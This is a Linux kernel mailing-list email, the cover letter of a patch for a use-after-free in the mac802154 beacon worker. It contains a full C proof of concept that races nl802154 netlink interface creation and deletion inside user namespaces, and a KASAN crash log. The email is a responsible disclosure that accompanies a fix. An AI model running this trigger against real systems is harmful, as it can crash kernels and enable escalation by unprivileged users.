Received: from mail-pj1-f41.google.com (mail-pj1-f41.google.com [209.85.216.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 40E34390CB8
	for <linux-wpan@vger.kernel.org>; Sun,  2 Aug 2026 09:24:10 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785662652; cv=none; b=OCeIeOZ0PEiPrTBqwtNbSm0a6uGEiHWYMeYk+3f61GXkINNEzoV4fuNguccTOx/++120EPm6IlY6c7PsPmDSalsOxE6RD702o5/B3DmpVJWHLwssWYVLi10qFN0SPPU2uLt0fk5EuT4+d7VyqzuUc0YgRtpahmKcaLHAXiwpBdM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785662652; c=relaxed/simple;
	bh=06EQqBjVrRvdMy0KNSjJd+P79JKZ3Tct+czFDIuIMy8=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=F2usqSfg0+YzCoFR/1O+ZusExUJcpt0IsrQMk+diLHPAIkM9ghE+Zp0kpP7qePWe7iSDxvwos5eftahfEIZUUgfkVDRA+0iUm2MlFmlrjCieJ0WxGJujwLNjq7Bmtakb/pyvdpv+NOCNgFxHjNOYpoteFI8CJ8NCkAmPK2HvpM0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=YI5is2s5; arc=none smtp.client-ip=209.85.216.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="YI5is2s5"
Received: by mail-pj1-f41.google.com with SMTP id 98e67ed59e1d1-38dcbade417so2271881a91.1
        for <linux-wpan@vger.kernel.org>; Sun, 02 Aug 2026 02:24:10 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785662649; x=1786267449; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=ReQq+s8xA3BG8YMKZtcs73qvqjPdJD3MHnHuRiuAmUs=;
        b=YI5is2s5MRP+eA4x3KDukSXg8uL5vLYvAkLc+avS48KiyqrVOe+YER62m5r2eKrz3o
         LdZhWK6x4Uw0cU+8uNejawmSLd7bqj1uSwTYb78dQq2xJILh4L6uHVuJVIYqJVhM33b4
         pwqotdhlME47JCXGStUEMVGg5oi5OQRmffW+LZnIDWNSjB3D69/PWcNJDHG2lt///KGt
         iS/oUXGN3hZ9+9PzLisP9FnHJllZjwX/udv8A9OHnVY2RdZUVn0kQMSFurbEuxTxLfIX
         +LHQJ4IKwEiKafRHaO13/Xb4oz12/iKWMwZGyRfqf7oaintcj7DSwUyi3H2anc+IKK+Z
         GWvg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785662649; x=1786267449;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=ReQq+s8xA3BG8YMKZtcs73qvqjPdJD3MHnHuRiuAmUs=;
        b=siWJb+udrZWmSgAC7kqZpsQ+5rsFbthZPJcE5NQ20QTQNU6YOfeLT8tmFOFY9Ah1e1
         6g9TjptgCIuf4rLcUKc9h851O7lNGoAZaA5KPQOgniTf0ZPTggWux9w6rmh/hzPICZR9
         KZqu0ILoldGwmItXKBjqI0+X84qPwQnDENowrDoaCUDGJg3t2UTqNciBt3S1fh+cgjZM
         2Ggsvi8/Fhva5MRlMuv7kdbuPcrL0EL4OmuEgFiodMcGSF6ZLmGB9CcFrYxYsRwHAwLm
         ZtB5R/oOElRaHQkVL+YLHLIoWL7RqshtuKm5VS3C1+F/D7pOM60PG+Wj9YfPu7cSWKuj
         Sriw==
X-Gm-Message-State: AOJu0YwJp8Q3rdpdcVrApwxgGOViu7jC6lVFo2h6stoSF6mtT+o6AfcL
	/uBXFRtoJRp6RV1nT1koRidHZYtFHpC8ldYBB+7TNq3woyO2ATkwTF+4jZ9bvPq4HUmbJXnhWYz
	Rbd4KFWH7
X-Gm-Gg: AR+sD12lBQA7VvlRt9BEY9yn3bAdVgD4Rwu31Lrex1cwbkNEJ/2id0ZK/Q+ekbEZr37
	ncDkfmhU3tmCMEXVhesuGZbWKmH0LTkZMtefild2Z5E4cXx6ck7dlqnrKiKYwx5dirdHR73o5eX
	Iw3V8Q65vXQbfafw3rap5Z3VvAg+A1dkrwJYSRSM2Jpdft+hEct5IElN3o3BDyIuMFaFS22V2BB
	cyG1ePCaniyg0ARFCDuEUIDZ+StgS/a0iZ6Oc3RLC7pdm7/NkJCGCxp74fUX9ZqHPZOIbxOKzwv
	4YeEOcnhKl54F8UIPu3W7iplYq2jhX1CR/hA5rbJkDfy2U5RgYRqmEkIxRrdwpKDSPCfrPHbTB5
	YO/K9sK4NfcQi6z1zpdDN7DIMO+EUKHL3SpOAh4rf5JQRrmDUZ+j5vuLgXzXNkcbyPXA1sq7Ac2
	8/EHKBmSxuXvP1LpLDBB+Ygba689IoqUVZdQ4y0nrux+bE82vs5qgG5qY9pOBZXbZQAPSE2GDJc
	13nORnrbQ==
X-Received: by 2002:a17:90b:5605:b0:38e:dc4:3fbb with SMTP id 98e67ed59e1d1-38fbc579e5fmr5646106a91.43.1785662649131;
        Sun, 02 Aug 2026 02:24:09 -0700 (PDT)
Received: from localhost.localdomain ([115.192.251.96])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-38fb30a3c75sm2655325a91.9.2026.08.02.02.24.04
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 02 Aug 2026 02:24:08 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-wpan@vger.kernel.org,
	netdev@vger.kernel.org
Cc: alex.aring@gmail.com,
	stefan@datenfreihafen.org,
	miquel.raynal@bootlin.com,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	david.girault@qorvo.com,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/1] mac802154: Fix beacon worker UAF
Date: Sun,  2 Aug 2026 09:23:33 +0000
Message-ID: <cover.1785596603.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: linux-wpan@vger.kernel.org
List-Id: <linux-wpan.vger.kernel.org>
List-Subscribe: <mailto:linux-wpan+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wpan+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: quoted-printable

Hi Linux kernel maintainers,

We found and validated a issue in net/mac802154/scan.c. The bug is
reachable by a user who becomes namespaced root in user and net
namespaces, with nl802154 admin operations requiring CAP_NET_ADMIN in
that namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

mac802154_beacon_worker() reads local->beacon_req under RCU, derives the
sub-interface from beacon_req->wpan_dev, and then drops the RCU read
lock before using sdata and wpan_dev.

mac802154_stop_beacons_locked() only cancels pending delayed work with
cancel_delayed_work(), clears local->beacon_req, and frees the request.
If the beacon worker is already running, interface teardown can free the
netdev private area while the worker continues to dereference sdata and
the embedded wpan_dev outside RCU.

The selected baseline already contains an equivalent netdev reference
fix for mac802154_scan_worker(). This patch applies the same lifetime
rule to mac802154_beacon_worker(): take a netdev reference while the RCU
read lock still protects the request-derived sdata pointer, and release
it on every path that continues after the reference is acquired.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------=0D
#define _GNU_SOURCE
#include <errno.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <net/if.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif
#ifndef NLA_DATA
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#endif
#ifndef NLA_NEXT
#define NLA_NEXT(nla, attrlen) \
    ((attrlen) -=3D NLA_ALIGN((nla)->nla_len), \
     (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#endif
#ifndef NLA_OK
#define NLA_OK(nla, len) \
    ((len) >=3D (int)sizeof(struct nlattr) && (nla)->nla_len >=3D sizeof(st=
ruct nlattr) && \
     (nla)->nla_len <=3D (len))
#endif

#define NL802154_GENL_NAME "nl802154"
#define MAX_MSG 8192
#define PAN_ID_BASE 0x1234

enum nl802154_commands {
    NL802154_CMD_UNSPEC,
    NL802154_CMD_GET_WPAN_PHY,
    NL802154_CMD_SET_WPAN_PHY,
    NL802154_CMD_NEW_WPAN_PHY,
    NL802154_CMD_DEL_WPAN_PHY,
    NL802154_CMD_GET_INTERFACE,
    NL802154_CMD_SET_INTERFACE,
    NL802154_CMD_NEW_INTERFACE,
    NL802154_CMD_DEL_INTERFACE,
    NL802154_CMD_SET_CHANNEL,
    NL802154_CMD_SET_PAN_ID,
    NL802154_CMD_SET_SHORT_ADDR,
    NL802154_CMD_SET_TX_POWER,
    NL802154_CMD_SET_CCA_MODE,
    NL802154_CMD_SET_CCA_ED_LEVEL,
    NL802154_CMD_SET_MAX_FRAME_RETRIES,
    NL802154_CMD_SET_BACKOFF_EXPONENT,
    NL802154_CMD_SET_MAX_CSMA_BACKOFFS,
    NL802154_CMD_SET_LBT_MODE,
    NL802154_CMD_SET_ACKREQ_DEFAULT,
    NL802154_CMD_SET_WPAN_PHY_NETNS,
    NL802154_CMD_SET_SEC_PARAMS,
    NL802154_CMD_GET_SEC_KEY,
    NL802154_CMD_NEW_SEC_KEY,
    NL802154_CMD_DEL_SEC_KEY,
    NL802154_CMD_GET_SEC_DEV,
    NL802154_CMD_NEW_SEC_DEV,
    NL802154_CMD_DEL_SEC_DEV,
    NL802154_CMD_GET_SEC_DEVKEY,
    NL802154_CMD_NEW_SEC_DEVKEY,
    NL802154_CMD_DEL_SEC_DEVKEY,
    NL802154_CMD_GET_SEC_LEVEL,
    NL802154_CMD_NEW_SEC_LEVEL,
    NL802154_CMD_DEL_SEC_LEVEL,
    NL802154_CMD_SCAN_EVENT,
    NL802154_CMD_TRIGGER_SCAN,
    NL802154_CMD_ABORT_SCAN,
    NL802154_CMD_SCAN_DONE,
    NL802154_CMD_SEND_BEACONS,
    NL802154_CMD_STOP_BEACONS,
};

enum nl802154_attrs {
    NL802154_ATTR_UNSPEC,
    NL802154_ATTR_WPAN_PHY,
    NL802154_ATTR_WPAN_PHY_NAME,
    NL802154_ATTR_IFINDEX,
    NL802154_ATTR_IFNAME,
    NL802154_ATTR_IFTYPE,
    NL802154_ATTR_WPAN_DEV,
    NL802154_ATTR_PAGE,
    NL802154_ATTR_CHANNEL,
    NL802154_ATTR_PAN_ID,
    NL802154_ATTR_SHORT_ADDR,
    NL802154_ATTR_TX_POWER,
    NL802154_ATTR_CCA_MODE,
    NL802154_ATTR_CCA_OPT,
    NL802154_ATTR_CCA_ED_LEVEL,
    NL802154_ATTR_MAX_FRAME_RETRIES,
    NL802154_ATTR_MAX_BE,
    NL802154_ATTR_MIN_BE,
    NL802154_ATTR_MAX_CSMA_BACKOFFS,
    NL802154_ATTR_LBT_MODE,
    NL802154_ATTR_GENERATION,
    NL802154_ATTR_CHANNELS_SUPPORTED,
    NL802154_ATTR_SUPPORTED_CHANNEL,
    NL802154_ATTR_EXTENDED_ADDR,
    NL802154_ATTR_WPAN_PHY_CAPS,
    NL802154_ATTR_SUPPORTED_COMMANDS,
    NL802154_ATTR_ACKREQ_DEFAULT,
    NL802154_ATTR_PAD,
    NL802154_ATTR_PID,
    NL802154_ATTR_NETNS_FD,
    NL802154_ATTR_COORDINATOR,
    NL802154_ATTR_SCAN_TYPE,
    NL802154_ATTR_SCAN_FLAGS,
    NL802154_ATTR_SCAN_CHANNELS,
    NL802154_ATTR_SCAN_PREAMBLE_CODES,
    NL802154_ATTR_SCAN_MEAN_PRF,
    NL802154_ATTR_SCAN_DURATION,
    NL802154_ATTR_SCAN_DONE_REASON,
    NL802154_ATTR_BEACON_INTERVAL,
};

enum nl802154_iftype {
    NL802154_IFTYPE_UNSPEC =3D (~(__u32)0),
    NL802154_IFTYPE_NODE =3D 0,
    NL802154_IFTYPE_MONITOR,
    NL802154_IFTYPE_COORD,
};

struct nl_state {
    int fd;
    uint32_t seq;
    uint16_t family_id;
};

struct new_if_arg {
    uint32_t phy;
    const char *name;
    uint32_t iftype;
};

struct set_pan_arg {
    uint32_t ifidx;
    uint16_t pan_id;
};

struct beacon_arg {
    uint32_t ifidx;
    uint8_t interval;
};

static int add_attr(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
                    const void *data, size_t len)
{
    size_t off =3D NLMSG_ALIGN(nlh->nlmsg_len);
    size_t attr_len =3D NLA_HDRLEN + len;
    size_t new_len =3D off + NLA_ALIGN(attr_len);

    if (new_len > maxlen)
        return -1;

    struct nlattr *nla =3D (struct nlattr *)((char *)nlh + off);
    nla->nla_type =3D type;
    nla->nla_len =3D attr_len;
    memcpy((char *)nla + NLA_HDRLEN, data, len);
    memset((char *)nla + attr_len, 0, NLA_ALIGN(attr_len) - attr_len);
    nlh->nlmsg_len =3D new_len;
    return 0;
}

static int add_attr_u8(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
                       uint8_t val)
{
    return add_attr(nlh, maxlen, type, &val, sizeof(val));
}

static int add_attr_u16(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
                        uint16_t val)
{
    return add_attr(nlh, maxlen, type, &val, sizeof(val));
}

static int add_attr_u32(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
                        uint32_t val)
{
    return add_attr(nlh, maxlen, type, &val, sizeof(val));
}

static int add_attr_str(struct nlmsghdr *nlh, size_t maxlen, uint16_t type,
                        const char *s)
{
    return add_attr(nlh, maxlen, type, s, strlen(s) + 1);
}

static int nl_open(struct nl_state *st)
{
    struct sockaddr_nl addr;

    st->fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (st->fd < 0)
        return -errno;

    memset(&addr, 0, sizeof(addr));
    addr.nl_family =3D AF_NETLINK;
    addr.nl_pid =3D getpid() ^ (uint32_t)time(NULL);

    if (bind(st->fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        int err =3D -errno;
        close(st->fd);
        st->fd =3D -1;
        return err;
    }

    st->seq =3D 0;
    st->family_id =3D 0;
    return 0;
}

static int nl_send(struct nl_state *st, struct nlmsghdr *nlh)
{
    struct sockaddr_nl nladdr;
    struct iovec iov =3D {.iov_base =3D nlh, .iov_len =3D nlh->nlmsg_len};
    struct msghdr msg;

    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family =3D AF_NETLINK;

    memset(&msg, 0, sizeof(msg));
    msg.msg_name =3D &nladdr;
    msg.msg_namelen =3D sizeof(nladdr);
    msg.msg_iov =3D &iov;
    msg.msg_iovlen =3D 1;

    if (sendmsg(st->fd, &msg, 0) < 0)
        return -errno;

    return 0;
}

static int nl_recv_for_seq(struct nl_state *st, uint32_t seq,
                           int (*cb)(struct nlmsghdr *, void *), void *cb_a=
rg,
                           bool *got_answer)
{
    char buf[MAX_MSG];

    for (;;) {
        ssize_t len =3D recv(st->fd, buf, sizeof(buf), 0);
        if (len < 0) {
            if (errno =3D=3D EINTR)
                continue;
            return -errno;
        }

        for (struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
             NLMSG_OK(nlh, (unsigned int)len);
             nlh =3D NLMSG_NEXT(nlh, len)) {
            if (nlh->nlmsg_seq !=3D seq)
                continue;

            if (got_answer)
                *got_answer =3D true;

            if (nlh->nlmsg_type =3D=3D NLMSG_ERROR) {
                struct nlmsgerr *err =3D (struct nlmsgerr *)NLMSG_DATA(nlh);
                return err->error;
            }

            if (cb) {
                int ret =3D cb(nlh, cb_arg);
                if (ret)
                    return ret;
            } else {
                return 0;
            }

            if (nlh->nlmsg_type =3D=3D NLMSG_DONE)
                return 0;
        }
    }
}

static int parse_family_id(struct nlmsghdr *nlh, void *arg)
{
    uint16_t *family_id =3D arg;
    struct genlmsghdr *genl;
    struct nlattr *attr;
    int rem;

    if (nlh->nlmsg_type =3D=3D NLMSG_DONE)
        return 0;

    if (nlh->nlmsg_len < NLMSG_LENGTH(GENL_HDRLEN))
        return -EINVAL;

    genl =3D (struct genlmsghdr *)NLMSG_DATA(nlh);
    rem =3D nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);
    attr =3D (struct nlattr *)((char *)genl + GENL_HDRLEN);

    for (; NLA_OK(attr, rem); attr =3D NLA_NEXT(attr, rem)) {
        if (attr->nla_type =3D=3D CTRL_ATTR_FAMILY_ID) {
            *family_id =3D *(uint16_t *)NLA_DATA(attr);
            return 1;
        }
    }

    return 0;
}

static int nl_resolve_family(struct nl_state *st, const char *family_name)
{
    char buf[MAX_MSG];
    struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
    struct genlmsghdr *genl =3D (struct genlmsghdr *)NLMSG_DATA(nlh);
    uint32_t seq =3D ++st->seq;
    uint16_t id =3D 0;
    bool got =3D false;
    int ret;

    memset(buf, 0, sizeof(buf));
    nlh->nlmsg_len =3D NLMSG_LENGTH(GENL_HDRLEN);
    nlh->nlmsg_type =3D GENL_ID_CTRL;
    nlh->nlmsg_flags =3D NLM_F_REQUEST;
    nlh->nlmsg_seq =3D seq;
    genl->cmd =3D CTRL_CMD_GETFAMILY;
    genl->version =3D 1;

    if (add_attr_str(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, family_name) =
< 0)
        return -EMSGSIZE;

    ret =3D nl_send(st, nlh);
    if (ret < 0)
        return ret;

    for (;;) {
        ret =3D nl_recv_for_seq(st, seq, parse_family_id, &id, &got);
        if (ret =3D=3D 1)
            break;
        if (ret < 0)
            return ret;
        if (got)
            break;
    }

    if (!id)
        return -ENOENT;

    st->family_id =3D id;
    return 0;
}

static int nl_cmd(struct nl_state *st, uint8_t cmd,
                  int (*fill)(struct nlmsghdr *, size_t, void *), void *fil=
l_arg,
                  bool need_ack)
{
    char buf[MAX_MSG];
    struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
    struct genlmsghdr *genl =3D (struct genlmsghdr *)NLMSG_DATA(nlh);
    uint32_t seq =3D ++st->seq;
    bool got =3D false;
    int ret;

    memset(buf, 0, sizeof(buf));
    nlh->nlmsg_len =3D NLMSG_LENGTH(GENL_HDRLEN);
    nlh->nlmsg_type =3D st->family_id;
    nlh->nlmsg_flags =3D NLM_F_REQUEST | (need_ack ? NLM_F_ACK : 0);
    nlh->nlmsg_seq =3D seq;
    genl->cmd =3D cmd;
    genl->version =3D 1;

    if (fill && fill(nlh, sizeof(buf), fill_arg) < 0)
        return -EMSGSIZE;

    ret =3D nl_send(st, nlh);
    if (ret < 0)
        return ret;

    if (!need_ack)
        return 0;

    ret =3D nl_recv_for_seq(st, seq, NULL, NULL, &got);
    if (ret < 0)
        return ret;

    return 0;
}

static int set_if_up(const char *ifname, bool up)
{
    int fd =3D socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;

    if (fd < 0)
        return -errno;

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0) {
        int err =3D -errno;
        close(fd);
        return err;
    }

    if (up)
        ifr.ifr_flags |=3D IFF_UP;
    else
        ifr.ifr_flags &=3D ~IFF_UP;

    if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
        int err =3D -errno;
        close(fd);
        return err;
    }

    close(fd);
    return 0;
}

static int fill_new_if(struct nlmsghdr *nlh, size_t maxlen, void *arg_)
{
    struct new_if_arg *arg =3D arg_;

    if (add_attr_u32(nlh, maxlen, NL802154_ATTR_WPAN_PHY, arg->phy) < 0)
        return -1;
    if (add_attr_str(nlh, maxlen, NL802154_ATTR_IFNAME, arg->name) < 0)
        return -1;
    if (add_attr_u32(nlh, maxlen, NL802154_ATTR_IFTYPE, arg->iftype) < 0)
        return -1;

    return 0;
}

static int fill_ifidx(struct nlmsghdr *nlh, size_t maxlen, void *arg_)
{
    uint32_t ifidx =3D *(uint32_t *)arg_;
    return add_attr_u32(nlh, maxlen, NL802154_ATTR_IFINDEX, ifidx);
}

static int fill_set_pan(struct nlmsghdr *nlh, size_t maxlen, void *arg_)
{
    struct set_pan_arg *arg =3D arg_;

    if (add_attr_u32(nlh, maxlen, NL802154_ATTR_IFINDEX, arg->ifidx) < 0)
        return -1;
    if (add_attr_u16(nlh, maxlen, NL802154_ATTR_PAN_ID, arg->pan_id) < 0)
        return -1;
    return 0;
}

static int fill_beacon(struct nlmsghdr *nlh, size_t maxlen, void *arg_)
{
    struct beacon_arg *arg =3D arg_;

    if (add_attr_u32(nlh, maxlen, NL802154_ATTR_IFINDEX, arg->ifidx) < 0)
        return -1;
    if (add_attr_u8(nlh, maxlen, NL802154_ATTR_BEACON_INTERVAL, arg->interv=
al) < 0)
        return -1;
    return 0;
}

static int cmd_new_interface(struct nl_state *st, uint32_t phy, const char =
*name,
                             uint32_t iftype)
{
    struct new_if_arg arg =3D {
        .phy =3D phy,
        .name =3D name,
        .iftype =3D iftype,
    };
    return nl_cmd(st, NL802154_CMD_NEW_INTERFACE, fill_new_if, &arg, true);
}

static int cmd_del_interface(struct nl_state *st, uint32_t ifidx)
{
    return nl_cmd(st, NL802154_CMD_DEL_INTERFACE, fill_ifidx, &ifidx, true);
}

static int cmd_set_pan_id(struct nl_state *st, uint32_t ifidx, uint16_t pan=
_id)
{
    struct set_pan_arg arg =3D {
        .ifidx =3D ifidx,
        .pan_id =3D pan_id,
    };
    return nl_cmd(st, NL802154_CMD_SET_PAN_ID, fill_set_pan, &arg, true);
}

static int cmd_send_beacons(struct nl_state *st, uint32_t ifidx, uint8_t in=
terval)
{
    struct beacon_arg arg =3D {
        .ifidx =3D ifidx,
        .interval =3D interval,
    };
    return nl_cmd(st, NL802154_CMD_SEND_BEACONS, fill_beacon, &arg, true);
}

int main(int argc, char **argv)
{
    struct nl_state st;
    int iterations =3D 100000;
    uint32_t phy =3D 0;
    uint64_t create_ok =3D 0, beacon_ok =3D 0, del_ok =3D 0;
    int ret;

    if (argc > 1)
        iterations =3D atoi(argv[1]);

    srand((unsigned int)time(NULL));
    memset(&st, 0, sizeof(st));

    ret =3D nl_open(&st);
    if (ret < 0) {
        fprintf(stderr, "nl_open failed: %d\n", ret);
        return 1;
    }

    ret =3D nl_resolve_family(&st, NL802154_GENL_NAME);
    if (ret < 0) {
        fprintf(stderr, "resolve %s failed: %d\n", NL802154_GENL_NAME, ret);
        return 1;
    }

    for (int i =3D 0; i < iterations; i++) {
        char ifname[32];
        uint32_t ifidx;
        uint16_t pan_id =3D (uint16_t)(PAN_ID_BASE + (i & 0xff));
        struct timespec ts;

        snprintf(ifname, sizeof(ifname), "bcn%d", i % 1000);

        ret =3D cmd_new_interface(&st, phy, ifname, NL802154_IFTYPE_COORD);
        if (ret < 0) {
            if (ret =3D=3D -EEXIST) {
                sched_yield();
                continue;
            }
            fprintf(stderr, "[%d] new_interface(%s) failed: %d\n", i, ifnam=
e, ret);
            continue;
        }
        create_ok++;

        ifidx =3D if_nametoindex(ifname);
        if (!ifidx) {
            fprintf(stderr, "[%d] if_nametoindex(%s) failed\n", i, ifname);
            continue;
        }

        ret =3D cmd_set_pan_id(&st, ifidx, pan_id);
        if (ret < 0) {
            fprintf(stderr, "[%d] set_pan_id(%u) failed: %d\n", i, ifidx, r=
et);
            cmd_del_interface(&st, ifidx);
            continue;
        }

        ret =3D set_if_up(ifname, true);
        if (ret < 0) {
            fprintf(stderr, "[%d] set_if_up(%s) failed: %d\n", i, ifname, r=
et);
            cmd_del_interface(&st, ifidx);
            continue;
        }

        ret =3D cmd_send_beacons(&st, ifidx, 0);
        if (ret < 0) {
            fprintf(stderr, "[%d] send_beacons(%u) failed: %d\n", i, ifidx,=
 ret);
            cmd_del_interface(&st, ifidx);
            continue;
        }
        beacon_ok++;

        ts.tv_sec =3D 0;
        ts.tv_nsec =3D (long)(1000 * (50 + (rand() % 600)));
        nanosleep(&ts, NULL);

        ret =3D cmd_del_interface(&st, ifidx);
        if (ret < 0 && ret !=3D -ENODEV)
            fprintf(stderr, "[%d] del_interface(%u) failed: %d\n", i, ifidx=
, ret);
        else
            del_ok++;

        if ((i % 100) =3D=3D 0) {
            printf("iter=3D%d create_ok=3D%llu beacon_ok=3D%llu del_ok=3D%l=
lu\n",
                   i,
                   (unsigned long long)create_ok,
                   (unsigned long long)beacon_ok,
                   (unsigned long long)del_ok);
            fflush(stdout);
        }
    }

    close(st.fd);
    return 0;
}=0D
------END poc.c--------

----BEGIN crash log----=0D
[   45.261167] net bcn629: Beacon could not be transmitted (-100)=0D
[   45.538139] net bcn637: Beacon could not be transmitted (-100)=0D
[   45.712979] net bcn642: Beacon could not be transmitted (-100)=0D
[   45.880237] net bcn648: Beacon could not be transmitted (-100)=0D
[   45.930786] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=0D
[   45.945098] BUG: KASAN: slab-use-after-free in mac802154_beacon_worker (=
net/mac802154/scan.c:447)=0D
[   45.958894] Read of size 8 at addr ffff888009701b28 by task kworker/u8:2=
/54=0D
[   45.971385] =0D
[   45.973998] CPU: 0 UID: 0 PID: 54 Comm: kworker/u8:2 Not tainted 7.2.0-r=
c4-g88c17de85ddb #1 PREEMPT(lazy) =0D
[   45.974003] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_=
caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[   45.974005] Workqueue: phy0-mac-cmds mac802154_beacon_worker=0D
[   45.974012] Call Trace:=0D
[   45.974015]  <TASK>=0D
[   45.974017]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)=0D
[   45.974021]  print_report (mm/kasan/report.c:378 mm/kasan/report.c:482)=
=0D
[   45.974024]  ? __pfx__raw_spin_lock_irqsave (include/asm-generic/qrwlock=
.h:122 (discriminator 4))=0D
[   45.974027]  ? mac802154_beacon_worker (net/mac802154/scan.c:447)=0D
[   45.974029]  kasan_report (mm/kasan/report.c:595)=0D
[   45.974031]  ? mac802154_beacon_worker (net/mac802154/scan.c:447)=0D
[   45.974033]  mac802154_beacon_worker (net/mac802154/scan.c:447)=0D
[   45.974035]  process_one_work (kernel/workqueue.c:3322)=0D
[   45.974040]  ? assign_work (kernel/workqueue.c:1233)=0D
[   45.974042]  worker_thread (kernel/workqueue.c:3405 kernel/workqueue.c:3=
486)=0D
[   45.974044]  ? __pfx_worker_thread (include/linux/list.h:249)=0D
[   45.974046]  kthread (kernel/kthread.c:436)=0D
[   45.974048]  ? recalc_sigpending (include/linux/instrumented.h:97 includ=
e/asm-generic/bitops/instrumented-atomic.h:41 include/linux/thread_info.h:1=
09 kernel/signal.c:181)=0D
[   45.974050]  ? __pfx_kthread (include/linux/list.h:162)=0D
[   45.974052]  ret_from_fork (arch/x86/kernel/process.c:158)=0D
[   45.974054]  ? __pfx_ret_from_fork (arch/x86/include/asm/desc.h:328 (dis=
criminator 7))=0D
[   45.974056]  ? __switch_to (arch/x86/kernel/process_64.c:403 arch/x86/ke=
rnel/process_64.c:663)=0D
[   45.974058]  ? __pfx_kthread (include/linux/list.h:162)=0D
[   45.974060]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)=0D
[   45.974063]  </TASK>=0D
[   45.974063] =0D
[   46.185457] Allocated by task 257:=0D
[   46.191459]  kasan_save_stack (mm/kasan/common.c:57)=0D
[   46.198963]  kasan_save_track (mm/kasan/common.c:78)=0D
[   46.206032]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:41=
5)=0D
[   46.212506]  __kvmalloc_node_noprof (include/linux/kasan.h:263 mm/slub.c=
:5362 mm/slub.c:6933)=0D
[   46.220575]  alloc_netdev_mqs (net/core/dev.c:12054 (discriminator 2))=0D
[   46.228370]  ieee802154_if_add (net/mac802154/iface.c:620)=0D
